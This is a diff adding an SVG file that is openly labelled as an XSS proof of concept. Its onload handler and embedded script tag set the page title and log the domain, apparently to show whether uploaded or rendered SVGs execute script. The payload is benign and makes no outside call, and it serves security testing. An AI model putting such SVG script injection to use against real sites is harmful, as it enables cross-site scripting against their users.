@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" onload="document.title='XSS-POC-SVG-ONLOAD'; console.log('XSS-POC-SVG-ONLOAD:' + document.domain);">
+  <script>document.title='XSS-POC-SVG-SCRIPT'; console.log('XSS-POC-SVG-SCRIPT:' + document.domain);</script>
+  <rect width="200" height="100" fill="red"/>
+  <text x="10" y="50" fill="white">XSS POC</text>
+</svg>
